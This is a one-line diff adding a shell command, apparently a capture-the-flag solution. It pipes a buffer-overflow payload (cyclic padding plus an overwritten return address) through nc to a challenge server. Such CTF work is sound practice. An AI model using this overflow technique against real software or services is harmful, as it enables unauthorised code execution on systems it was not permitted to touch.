@@ -1,0 +1,1 @@
+echo "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa\x6b\x85\x04\x08"| nc chals1.apoorvctf.xyz 3001
